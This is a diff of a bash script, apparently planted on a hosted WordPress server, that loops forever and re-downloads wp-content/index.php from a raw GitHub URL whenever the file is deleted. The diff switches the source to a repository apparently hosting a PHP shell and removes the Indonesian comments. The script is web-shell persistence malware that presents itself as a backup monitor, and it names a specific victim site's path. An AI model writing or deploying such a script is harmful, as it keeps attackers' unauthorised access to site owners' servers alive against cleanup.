@@ -1,27 +1,21 @@
 #!/bin/bash
 
-# Path ke file index.php yang harus dijaga
 outputFile="/var/www/vhosts/web924.kerstin.webhoster.ag/httpdocs/wp-content/index.php"
 
-# Sumber file cadangan
-url="https://raw.githubusercontent.com/PACKDOL/shallg16/main/xxx.txt"
+url="https://raw.githubusercontent.com/oxxxTYPOxxxo/SCPHP/refs/heads/main/xxxTYPOxxx.php"
 
-# Log file untuk pencatatan aktivitas (opsional tapi direkomendasikan)
 logFile="/var/log/index_monitor.log"
 
-# Fungsi logging
 log() {
     echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$logFile"
 }
 
-# Fungsi membersihkan saat script dihentikan
 cleanup() {
     log "Script dihentikan."
     exit 0
 }
 trap cleanup SIGINT SIGTERM
 
-# Fungsi untuk mengunduh file
 download_file() {
     log "Mencoba mengunduh file dari $url"
     if command -v wget >/dev/null 2>&1; then
@@ -49,7 +43,6 @@ download_file() {
     fi
 }
 
-# Loop pengecekan terus-menerus
 while true; do
     if [ ! -f "$outputFile" ]; then
         log "File index.php tidak ditemukan. Mengunduh kembali..."
